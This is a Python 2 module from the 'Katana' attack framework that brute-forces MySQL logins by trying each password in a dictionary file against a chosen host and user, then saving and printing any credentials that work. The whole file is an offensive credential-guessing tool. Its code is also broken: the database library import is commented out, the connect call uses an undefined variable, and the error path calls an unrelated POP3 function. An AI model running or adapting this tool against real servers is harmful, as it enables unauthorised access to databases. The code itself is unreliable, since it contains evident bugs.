# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# @KATANA                       #
# Modules   : SQL Brute Force   #
# Script by : RedToor           #
# Date      : 16/05/2015        #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core                   #
from core.design import *       #
from core import help           #
from core import ping           #
d=DESIGN()                      #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Libraries                     #
#from lib import MySQLdb        #
import socket                   # 
import time                     #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Default                       #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
defaulthost="127.0.0.1"
defaultport="3306"
defaultuser="admin"
defaultdicc="core/db/pass.dicc"

def run(para,parb,parc,pard):
	global defaulthost,defaultport,defaultuser,defaultdicc
	defaulthost=para
	defaultport=parb
	defaultuser=parc
	defaultdicc=pard
	btsql(1)

def btsql(run):
	try:
		global defaulthost,defaultport,defaultuser,defaultdicc
		if run!=1:
			actions=raw_input(d.prompt("bt/sql"))
		else:
			actions="run"
		if actions == "show options" or actions == "sop":
			d.option()
			d.descrip("target","yes","IP or DNS",defaulthost)
			d.descrip("port","no","Port of target",defaultport)
 			d.descrip("user","yes","Username",defaultuser)
 			d.descrip("dict_1","yes","Dictionary pass",defaultdicc)
			print ""
			btsql(0)
		elif actions[0:10] == "set target":
			defaulthost = actions[11:]
			defaulthost = defaulthost.replace("http://", "")
			d.change("target",defaulthost)
			btsql(0)
		elif actions[0:8] == "set port":
			defaultport = actions[9:]
			d.change("port",defaultport)
			btsql(0)
		elif actions[0:8] == "set user":
			defaultuser = actions[9:]
			d.change("user",defaultuser)
			btsql(0)
		elif actions[0:10] == "set dict_1":
			defaultdicc = actions[11:]
			d.change("dict_1",defaultdicc)
			btsql(0)
		elif actions=="exit" or actions=="x":
			d.goodbye()
			exit()
		elif actions=="help" or actions=="h":
			help.help()
		elif actions=="back" or actions=="b":
			return
			return
		elif actions=="run"  or actions=="r":
			d.run()
			try:
				ping.live(defaulthost,defaultport)
				if True:
					try:
						d.loading()
						try:
							with open(defaultdicc,'r') as passs:
								for ps in passs:
									ps=ps.replace("\n","")
									try:
										MySQLdb.connect(defaulthost,us,ps,'')
										if True:
											ping.save("BruteForceSQL",defaulthost,defaultport,defaultuser,ps)
											print "\n-"+Suf+" Successfully with ("+defaultuser+"="+ps+")\n"
											return 1
									except:
										print " "+Alr+" Checking ("+defaultuser+"="+ps+")"
						except:
							d.filenot(defaultdicc)
							btpop3(0)
					except:
						d.kbi()
			except:
				d.off()
		else:
			d.nocommand()
	except:
		d.kbi()
		exit()
	btsql(0)